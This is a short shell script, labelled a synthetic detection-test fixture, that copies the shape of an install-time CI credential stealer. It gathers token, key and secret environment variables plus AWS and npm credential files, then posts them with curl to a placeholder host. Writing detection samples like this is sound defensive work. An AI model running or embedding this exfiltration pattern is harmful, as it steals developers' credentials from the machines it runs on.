#!/bin/sh
# FIXTURE ONLY — synthetic detection test sample, not real malware
# Shape of the November 2026 install-time CI stealer: collect into a temp file, send it later.
out=$(mktemp)
env | grep -E 'TOKEN|KEY|SECRET' > "$out"
cat "$HOME/.aws/credentials" "$HOME/.npmrc" >> "$out" 2>/dev/null
curl -s -X POST --data-binary @"$out" https://collect.example.invalid/x
rm -f "$out"
